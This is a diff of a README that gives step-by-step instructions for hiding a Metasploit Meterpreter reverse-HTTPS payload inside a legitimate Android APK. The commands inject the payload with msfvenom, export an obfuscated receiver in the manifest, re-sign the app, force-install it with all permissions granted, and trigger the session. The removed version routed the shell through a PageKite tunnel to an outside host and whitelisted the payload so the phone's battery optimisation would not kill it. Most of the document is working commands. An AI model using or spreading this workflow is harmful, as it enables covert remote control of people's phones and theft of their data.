@@ -1,53 +1,97 @@
-# Meterpreter Session on Android 16 - Samsung Z Flip 5
+# Meterpreter Session on Android 16 - Samsung Z Flip 5 (2026)
 
-Complete guide to establishing a working Meterpreter reverse shell session on Android 16 running on a Samsung Z Flip 5 using Metasploit Framework. Initial "backdoored" APK installation & full permission grants (SMS, Microphone, Phone, Storage etc.) are required.
+# Android Penetration Testing Workflow: APK Modification & Local Deployment
+
+This repository documents the technical process of injecting a Metasploit payload into an Android application package (APK), engineering the manifest to allow explicit execution, cryptographically signing the binary, and deploying it locally via ADB for security testing.
 
 ## Prerequisites
 
-- Metasploit Framework installed
-- Android Debug Bridge (adb) installed
-- PageKite account and configured
-- Python3 installed
-- Root/ADB access to the Samsung Z Flip 5
+Ensure you have the following tools installed and available in your system path:
+* **Metasploit Framework** (`msfvenom`, `msfconsole`)
+* **Apktool**
+* **Java Development Kit** (`keytool`, `apksigner`)
+* **Android Debug Bridge** (`adb`)
 
-## Setup Instructions
+---
 
-### Step 1: Start PageKite Tunnel
+## Step 1: Payload Generation
 
-Open a terminal and start the PageKite tunnel on port 4444:
+Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.
 
 ```bash
-python3 pagekite.py 4444 raw-tcp:kalicopwn.pagekite.me
+msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=4444 -o output.apk
 ```
 
-**Note:** Replace `kalicopwn.pagekite.me` with your actual PageKite subdomain.
+---
 
-### Step 2: Configure ADB Reverse TCP (in separate terminal)
+## Step 2: Manifest Engineering
 
-First, remove any existing reverse TCP configurations:
+Decompile the binary package to modify its configuration, then recompile it to enforce structural integrity.
+
+### 1. Decompile the APK
+```bash
+apktool d output.apk -o unpacked_folder
+```
+
+### 2. Modify the Manifest
+Open `unpacked_folder/AndroidManifest.xml` in a text editor. Configure both primary entry points to explicitly allow OS execution by adding `android:exported="true"`.
+
+```xml
+<activity android:name="com.example.app.MainActivity" android:exported="true">
+<receiver android:name="com.example.app.qvqna.Ygdsa" android:exported="true">
+```
+
+### 3. Recompile the APK
+```bash
+apktool b unpacked_folder -o example_usb.apk
+```
+
+---
+
+## Step 3: Cryptographic Signing
+
+Android environments reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.
 
 ```bash
+# Generate a development keystore
+keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
+
+# Sign the recompiled APK
+apksigner sign --ks my-release-key.jks --out signed_usb.apk example_usb.apk
+```
+
+---
+
+## Step 4: System Clearing & Deployment
+
+Clear hanging processes from the local port assignment, reset the network translation layers, and install the application directly to the device's default workspace profile.
+
+```bash
+# Clear existing processes on port 4444
 sudo kill -9 $(lsof -t -i:4444) 2>/dev/null
+
+# Reset and establish ADB reverse port forwarding
 adb reverse --remove-all
-```
-
-Set up the reverse TCP tunnel from device to host:
-
-```bash
 adb reverse tcp:4444 tcp:4444
+
+# Remove old installations and force-install the new package
+adb uninstall com.example.app
+adb install --user 0 -r -d -g signed_usb.apk
 ```
 
-### Step 3: Set Up Metasploit Handler (in new shell)
+---
 
-Launch msfconsole and configure the multi/handler exploit:
+## Step 5: Session Handling & Execution
+
+Initialize the Metasploit framework locally to listen for the incoming reverse connection.
 
 ```bash
 msfconsole
 ```
 
-Within msfconsole, run the following commands:
+Inside the Metasploit console, execute the following handler configuration:
 
-```
+```rc
 use exploit/multi/handler
 set PAYLOAD android/meterpreter/reverse_https
 set LHOST 127.0.0.1
@@ -56,49 +100,21 @@ set IgnorePayloadUUIDs true
 exploit
 ```
 
-**Expected output:** Handler will start listening for incoming connections.
-
-### Step 4: Enable Device Idle Whitelist (in bash terminal)
-
-Whitelist the Metasploit stage application to prevent system from killing the process:
+Force the device interface activity layer into the foreground, then trigger the underlying execution broadcast intent to catch the core session:
 
 ```bash
-adb shell dumpsys deviceidle whitelist +com.metasploit.stage
+# Force-start the main activity
+adb shell am start -n com.example.app/com.example.app.MainActivity
+
+# Trigger the broadcast receiver
+adb shell am broadcast -n com.example.app/com.example.app.qvqna.Ygdsa
 ```
 
-### Step 5: Trigger Meterpreter Session
-
-Send a broadcast to spawn the Meterpreter session:
-
-```bash
-adb shell am broadcast -n com.metasploit.stage/.MainBroadcastReceiver
+### Expected Output
+```text
+[*] Meterpreter session 1 opened successfully established.
 ```
 
-## Expected Result
-
-After executing Step 5, you should receive an active Meterpreter session in your msfconsole handler with a shell prompt.
-
-## Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Port 4444 already in use | Run: `sudo kill -9 $(lsof -t -i:4444)` |
-| Device not responding | Reconnect ADB: `adb disconnect && adb connect` |
-| No Meterpreter session | Ensure device idle whitelist is set and broadcast is sent |
-| PageKite connection fails | Verify pagekite.me credentials and internet connection |
-
-## Notes
-
-- The `IgnorePayloadUUIDs true` setting is important for Android compatibility
-- Ensure ADB reverse is properly configured before running the broadcast
-- Device must have Metasploit stage APK pre-installed or injected
-- This process requires ADB debugging enabled on the device
-
-## References
-
-- [Metasploit Framework Documentation](https://docs.metasploit.com/)
-- [Android Debug Bridge (adb)](https://developer.android.com/tools/adb)
-- [PageKite Documentation](https://pagekite.net/)
 
 ---
 
